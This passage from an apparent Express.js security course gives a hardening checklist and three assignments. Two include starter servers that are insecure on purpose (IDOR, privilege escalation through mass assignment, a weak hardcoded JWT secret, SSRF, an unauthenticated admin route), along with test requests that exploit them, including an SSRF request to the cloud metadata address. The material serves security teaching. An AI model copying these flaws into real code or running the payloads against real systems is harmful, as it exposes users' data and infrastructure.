  □ No admin functionality accessible without an admin role check

Input & Output
  □ All input validated with Zod or Joi before it reaches DB layer
  □ All DB queries use parameterized statements (no string concatenation)
  □ NoSQL operator injection prevented (express-mongo-sanitize or type checks)
  □ No raw innerHTML / dangerouslySetInnerHTML with user content
  □ Mass assignment prevented — only explicitly listed fields written to DB

HTTP & Headers
  □ helmet() applied globally before all routes
  □ Content Security Policy configured
  □ CORS has an explicit origin allowlist — no * on authenticated APIs
  □ HTTPS enforced in production with HSTS header
  □ Stack traces hidden in production error responses

Dependencies & Configuration
  □ npm audit passes with 0 high or critical vulnerabilities
  □ No secrets committed to Git
  □ .env in .gitignore
  □ NODE_ENV=production in production
  □ package-lock.json committed to version control

Logging & Monitoring
  □ Auth successes and failures logged with IP and timestamp
  □ Authorization failures (403s) logged
  □ No passwords, tokens, or PII in any log output
  □ Logs shipped to a persistent, external store
```

> Further reading: [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/) · [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) · [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

## Assignment.

1.  **Harden a Bare Express Server.**

    **What you practice:**

    `helmet` for HTTP security headers · CORS with an explicit origin allowlist · `bcrypt`
    hashing on register and `bcrypt.compare` on login · rate limiting on auth routes ·
    environment-aware error handler that hides stack traces in production · `dotenv` for
    environment loading · never returning sensitive fields in API responses.

    **Requirements:**
    - `POST /api/auth/register` — validate inputs, hash password with bcrypt (12 rounds), store user, return `{ message, email }` (no password field).
    - `POST /api/auth/login` — compare with `bcrypt.compare`, return `{ message: 'Logged in' }` on success (no user object in response).
    - Apply `helmet()` as the first middleware.
    - CORS: only allow `http://localhost:5173`.
    - Rate limit both auth routes: max 5 requests per IP per 15 minutes.
    - Global error handler: show `message` and `stack` in development, only `{ message: 'Something went wrong' }` in production.
    - Load env vars from a `.env` file with `dotenv`.

    [Solution](./Assignment/code1)

    **Postman Test Cases.**

    ```
    # Register
    POST http://localhost:3000/api/auth/register
    Body: { "email": "alice@example.com", "password": "secret123" }
    → 201 { message: 'Registered', email: 'alice@example.com' }   (no password field)

    # Login — correct
    POST http://localhost:3000/api/auth/login
    Body: { "email": "alice@example.com", "password": "secret123" }
    → 200 { message: 'Logged in' }   (no user object, no token yet)

    # Login — wrong password
    POST http://localhost:3000/api/auth/login
    Body: { "email": "alice@example.com", "password": "wrong" }
    → 401 { message: 'Invalid credentials' }

    # Missing fields
    POST http://localhost:3000/api/auth/register
    Body: { "email": "alice@example.com" }
    → 400 { message: 'Email and password are required' }

    # Rate limit — 6th request within 15 min from same IP
    POST http://localhost:3000/api/auth/login   (6th attempt)
    → 429 { error: 'Too many attempts. Please try again in 15 minutes.' }

    # Stack trace visibility
    GET http://localhost:3000/api/break
    NODE_ENV=development  → 500 { message: '...', stack: '...' }
    NODE_ENV=production   → 500 { message: 'Something went wrong' }  (no stack)

    # Security headers (inspect response headers)
    GET http://localhost:3000/api/break
    → Headers include: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security
    ```

2.  **Find and Fix IDOR + Privilege Escalation.**

    **What you practice:**

    Reading unfamiliar code for security flaws · identifying IDOR (A01) and mass assignment
    privilege escalation (A01) · writing curl proof-of-exploit commands · ownership checks
    on resource queries · stripping sensitive fields from request bodies · JWT startup guard
    that refuses to run with a weak or missing secret · `alg` enforcement on `jwt.verify`.

    **Requirements:**

    **Part 1 : Find the vulnerabilities.** Read the starter code and identify both vulnerabilities. For each, name the OWASP category.

    **Part 2 : Prove they are exploitable.** Write the curl commands that demonstrate each vulnerability. Show a clearly bad outcome.

    **Part 3 : Fix them.** Produce a `server.js` that eliminates both vulnerabilities without breaking legitimate functionality. Also move the JWT secret to `.env` and add a startup check that throws if `JWT_SECRET` is missing or shorter than 32 characters.

    **Starter Code.**

    ```js
    // server.js
    const express = require("express");
    const jwt = require("jsonwebtoken");
    const bcrypt = require("bcrypt");

    const app = express();
    app.use(express.json());

    const JWT_SECRET = "secret"; // ← already suspicious

    const users = [];
    const notes = [
      {
        id: 1,
        userId: 1,
        title: "Alice secret plan",
        body: "Launch on Monday",
      },
      {
        id: 2,
        userId: 2,
        title: "Bob private note",
        body: "Password is hunter2",
      },
      { id: 3, userId: 1, title: "Alice shopping", body: "Milk, eggs, bread" },
    ];
    let nextNoteId = 4;

    app.post("/api/register", async (req, res) => {
      const { email, password, role } = req.body; // ← accepts role from the body
      const hashed = await bcrypt.hash(password, 10);
      const user = { id: users.length + 1, email, password: hashed, role };
      users.push(user);
      res.status(201).json({ id: user.id, email: user.email });
    });

    app.post("/api/login", async (req, res) => {
      const { email, password } = req.body;
      const user = users.find((u) => u.email === email);
      if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(401).json({ message: "Invalid credentials" });
      }
      const token = jwt.sign({ userId: user.id, role: user.role }, JWT_SECRET, {
        expiresIn: "1h",
      });
      res.json({ token });
    });

    function authMiddleware(req, res, next) {
      const token = req.headers.authorization?.split(" ")[1];
      if (!token) return res.status(401).json({ message: "No token" });
      try {
        req.user = jwt.verify(token, JWT_SECRET);
        next();
      } catch {
        res.status(401).json({ message: "Invalid token" });
      }
    }

    // Get a single note
    app.get("/api/notes/:id", authMiddleware, (req, res) => {
      const note = notes.find((n) => n.id === parseInt(req.params.id));
      if (!note) return res.status(404).json({ message: "Not found" });
      res.json(note); // ← returns it regardless of who owns it
    });

    // Create a note
    app.post("/api/notes", authMiddleware, (req, res) => {
      const note = { id: nextNoteId++, userId: req.user.userId, ...req.body }; // ← mass assignment
      notes.push(note);
      res.status(201).json(note);
    });

    // Admin: list all users
    app.get("/api/admin/users", authMiddleware, (req, res) => {
      if (req.user.role !== "admin")
        return res.status(403).json({ message: "Forbidden" });
      res.json(users.map((u) => ({ id: u.id, email: u.email, role: u.role })));
    });

    app.listen(3000, () => console.log("Running on 3000"));
    ```

    [Solution](./Assignment/code2)

    **Postman Test Cases.**

    ```
    # --- Proving IDOR ---
    # Register Carol (a brand new user who owns no notes)
    POST http://localhost:3000/api/register
    Body: { "email": "carol@example.com", "password": "password123" }

    # Login as Carol
    POST http://localhost:3000/api/login
    Body: { "email": "carol@example.com", "password": "password123" }
    → copy the token

    # Read Alice's private note as Carol — should be 403
    GET http://localhost:3000/api/notes/1
    Authorization: Bearer <carol_token>
    BEFORE fix → 200 { id: 1, title: 'Alice secret plan', body: 'Launch on Monday' }  ← IDOR
    AFTER  fix → 403 { message: 'Forbidden' }

    # Carol can still read her own notes
    GET http://localhost:3000/api/notes/<carol_note_id>
    → 200 ✓

    # --- Proving Privilege Escalation ---
    # Register with role: admin in the body
    POST http://localhost:3000/api/register
    Body: { "email": "evil@example.com", "password": "password123", "role": "admin" }

    # Login
    POST http://localhost:3000/api/login
    Body: { "email": "evil@example.com", "password": "password123" }
    → copy the token

    # Access admin route
    GET http://localhost:3000/api/admin/users
    Authorization: Bearer <evil_token>
    BEFORE fix → 200 full user list  ← privilege escalation
    AFTER  fix → 403 { message: 'Forbidden' }

    # --- JWT startup guard ---
    # Set JWT_SECRET to something short in .env
    JWT_SECRET=short
    npm start
    → FATAL: JWT_SECRET must be set and at least 32 characters long.
    ```

3.  **Full Security Audit & Remediation.**

    **What you practice:**

    Reading unfamiliar production code for security issues · mapping each finding to an
    OWASP category · writing proof-of-exploit commands · fixing JWT with no expiry (A07) ·
    crashing auth middleware (A05) · business logic negative quantity exploit (A04) ·
    IDOR on orders (A01) · SSRF on a URL preview endpoint (A10) · unauthenticated admin
    route (A01) · config-first architecture with startup validation · DNS-aware SSRF
    protection · graceful shutdown.

    **Requirements:**

    **Part 1 : Identify.** Find all 6 vulnerabilities in the starter code below. For each: name the vulnerable line/endpoint, the OWASP category, and what an attacker can do.

    **Part 2 : Prove.** Write the curl command that exploits each vulnerability. Show the bad outcome.

    **Part 3 : Fix.** Produce a fully hardened `server.js` that eliminates all 6 vulnerabilities while preserving all legitimate functionality.

    **Starter Code.**

    ```js
    // server.js — The Vulnerable E-Commerce API
    const express = require("express");
    const jwt = require("jsonwebtoken");
    const bcrypt = require("bcrypt");
    const axios = require("axios");

    const app = express();
    app.use(express.json());

    const SECRET = "supersecret";

    const users = [
      {
        id: 1,
        email: "alice@shop.com",
        password:
          "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy",
        role: "user",
      },
      // alice's password is "password123"
    ];
    const products = [
      { id: 1, name: "Laptop", price: 999, stock: 5 },
      { id: 2, name: "Phone", price: 599, stock: 10 },
    ];
    const orders = [];
    let nextOrderId = 1;

    app.post("/api/login", async (req, res) => {
      const { email, password } = req.body;
      const user = users.find((u) => u.email === email);
      if (!user || !(await bcrypt.compare(password, user.password))) {
        return res.status(401).json({ message: "Invalid credentials" });
      }
      const token = jwt.sign({ userId: user.id, role: user.role }, SECRET);
      // ↑ no expiry set
      res.json({ token });
    });

    function auth(req, res, next) {
      const token = req.headers["x-token"];
      if (!token) return res.status(401).json({ message: "No token" });
      req.user = jwt.verify(token, SECRET);
      // ↑ no try/catch — crashes the server on invalid tokens
      next();
    }

    app.get("/api/products/search", (req, res) => {
      const { q } = req.query;
      const results = products.filter((p) =>
        p.name.toLowerCase().includes(q.toLowerCase()),
      );
      res.json({ query: q, results });
      // ↑ reflects raw user input back in the response
    });

    app.post("/api/orders", auth, (req, res) => {
      const { productId, quantity } = req.body;
      const product = products.find((p) => p.id === productId);
      if (!product)
        return res.status(404).json({ message: "Product not found" });
      const total = product.price * quantity; // ↑ no validation on quantity
      const order = {
        id: nextOrderId++,
        userId: req.user.userId,
        productId,
        quantity,
        total,
        status: "confirmed",
      };
      orders.push(order);
      res.status(201).json(order);
    });

    app.get("/api/orders/:id", auth, (req, res) => {
      const order = orders.find((o) => o.id === parseInt(req.params.id));
      if (!order) return res.status(404).json({ message: "Not found" });
      res.json(order); // ↑ no ownership check
    });

    app.post("/api/preview", auth, async (req, res) => {
      const { url } = req.body;
      const response = await axios.get(url); // ↑ no URL validation — SSRF
      res.json({ title: response.data.slice(0, 200) });
    });

    app.get("/api/admin/orders", (req, res) => {
      // ↑ no auth at all
      res.json(orders);
    });

    app.listen(3000, () => console.log("Running"));
    ```

    [Solution](./Assignment/code3)

    **Postman Test Cases.**

    ```
    # Login as Alice to get a token
    POST http://localhost:3000/api/login
    Body: { "email": "alice@shop.com", "password": "password123" }
    → copy the token (use as x-token header for all subsequent requests)

    # Vuln 1 — JWT never expires
    # Inspect token at jwt.io → no "exp" field. Token valid forever.

    # Vuln 2 — Auth middleware crash
    GET http://localhost:3000/api/orders/1
    x-token: thisisnotavalidtoken
    BEFORE fix → 500 Internal Server Error (or unhandled exception crash)
    AFTER  fix → 401 { message: 'Invalid or expired token' }

    # Vuln 3 — Negative quantity
    POST http://localhost:3000/api/orders
    x-token: <alice_token>
    Body: { "productId": 1, "quantity": -5 }
    BEFORE fix → 201 { total: -4995 }   ← free money
    AFTER  fix → 400 { message: 'Quantity must be a positive integer' }

    # Vuln 4 — IDOR on orders
    # First place an order as Alice (order id 1)
    POST http://localhost:3000/api/orders
    x-token: <alice_token>
    Body: { "productId": 1, "quantity": 1 }
    # Now register a second user, login, and read Alice's order
    GET http://localhost:3000/api/orders/1
    x-token: <other_user_token>
    BEFORE fix → 200 with Alice's order data
    AFTER  fix → 403 { message: 'Forbidden' }

    # Vuln 5 — SSRF
    POST http://localhost:3000/api/preview
    x-token: <alice_token>
    Body: { "url": "http://169.254.169.254/latest/meta-data/" }
    BEFORE fix → server makes the request (returns AWS metadata in cloud, timeout locally)
    AFTER  fix → 400 { error: 'URL not allowed' }

    # Vuln 6 — Unauthenticated admin endpoint
    GET http://localhost:3000/api/admin/orders
    (no token, no headers at all)
    BEFORE fix → 200 with all orders
    AFTER  fix → 401 { message: 'No token' }
    ```
